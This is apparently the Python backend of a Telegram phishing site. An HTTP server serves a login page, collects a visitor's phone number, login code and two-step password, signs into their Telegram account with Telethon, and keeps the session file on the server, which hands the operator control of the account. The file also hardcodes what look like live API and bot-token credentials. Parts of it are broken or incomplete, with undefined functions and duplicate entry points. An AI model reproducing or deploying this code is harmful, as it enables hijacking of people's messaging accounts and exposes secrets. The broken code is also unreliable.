import json
import os
import asyncio
from aiogram import Bot
import requests
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from telethon.sync import TelegramClient
from telethon.errors import (
    PhoneCodeInvalidError,
    SessionPasswordNeededError,
    FloodWaitError,
    PhoneNumberInvalidError
)

API_ID = 25780325
API_HASH = "2c4cb6eee01a46dc648114813042c453"
BOT_TOKEN = "8485200508:AAEIwbb9HpGBUX_mWPGVplpxNRoXXnlSOrU"
bot = Bot(BOT_TOKEN)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
os.makedirs(SESSIONS_DIR, exist_ok=True)
BOT_NOTIFY_URL = "https://hyperactive-lorean-zoologically.ngrok-free.dev"
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
AUTHORIZED_FILE = os.path.join(BASE_DIR, "authorized_users.json")

# phone -> {client, phone_code_hash}
pending = {}

def session_path(phone):
    return os.path.join(SESSIONS_DIR, phone.replace("+", ""))

class LoginHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        if self.path in ["/", "/login.html"]:
            with open("login.html", "rb") as f:
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(f.read())
            return
        self.send_error(404)

    def do_POST(self):
        # 1️⃣ JSONni xavfsiz o‘qiymiz
        try:
            length = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(length)

            if not raw:
                return self.respond({"status": "empty_body"})

            data = json.loads(raw)
        except Exception as e:
            print("POST PARSE ERROR:", e)
            return self.respond({"status": "bad_request"})

        action = data.get("action")
        phone = data.get("phone")
        code = data.get("code")
        password = data.get("password")

        # ===== SEND CODE =====
        if action == "send_code":
            try:
                # eski session bo‘lsa yopamiz
                if phone in pending:
                    pending[phone]["client"].disconnect()
                    pending.pop(phone)

        # 🔥 SYNC TelegramClient
                client = TelegramClient(session_path(phone), API_ID, API_HASH)
                client.connect()

                sent = client.send_code_request(phone)

                pending[phone] = {
                    "client": client,
                    "hash": sent.phone_code_hash
               }

                return self.respond({"status": "code_sent"})

            except FloodWaitError as e:
                return self.respond({"status": "flood_wait", "seconds": e.seconds})

            except PhoneNumberInvalidError:
               return self.respond({"status": "phone_invalid"})

            except Exception as e:
               print("SEND CODE ERROR:", e)
               return self.respond({"status": "error", "message": str(e)})


                        # ===== VERIFY CODE =====
        if action == "verify_code":
            if phone not in pending:
                return self.respond({"status": "no_code_requested"})

            client = pending[phone]["client"]
            phone_hash = pending[phone]["hash"]

            try:
                client.sign_in(
                    phone=phone,
                    code=code,
                    phone_code_hash=phone_hash
                )
            except PhoneCodeInvalidError:
                return self.respond({"status": "invalid_code"})
            except SessionPasswordNeededError:
                return self.respond({"status": "2fa_required"})
            except Exception as e:
                return self.respond({"status": "error", "message": str(e)})

            # 🔥 ENG MUHIM JOY
            me = client.get_me()
            user_id = me.id

            conn = get_db()
            cur = conn.cursor()
            cur.execute("""
                INSERT OR REPLACE INTO authorized_users (user_id, phone)
                VALUES (?, ?)
            """, (str(user_id), phone))
            conn.commit()
            conn.close()


            client.disconnect()
            pending.pop(phone)
            return self.respond({"status": "success"})


        # ===== VERIFY PASSWORD (2FA) =====
        if action == "verify_password":
            if phone not in pending:
                return self.respond({"status": "no_session"})

            client = pending[phone]["client"]

            try:
                client.sign_in(password=password)
            except Exception:
                return self.respond({"status": "invalid_password"})

            # 🔥 ENG MUHIM JOY
            me = client.get_me()
            user_id = me.id

            conn = get_db()
            cur = conn.cursor()
            cur.execute("""
                INSERT OR REPLACE INTO authorized_users (user_id, phone)
                VALUES (?, ?)
            """, (str(user_id), phone))
            conn.commit()
            conn.close()


            client.disconnect()
            pending.pop(phone)

            return self.respond({"status": "success"})


    def respond(self, data):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

def notify_bot_sync(user_id):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    loop.run_until_complete(
        bot.send_message(
            int(user_id),
            "✅ Siz muvaffaqiyatli tizimga kirdingiz!\n\n"
            "👇 Endi botdan to‘liq foydalanishingiz mumkin:",
            reply_markup=main_menu()
        )
    )

    loop.close()

def run():
    import os

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 9000))
    app.run(host="0.0.0.0", port=port)


if __name__ == "__main__":
    run()

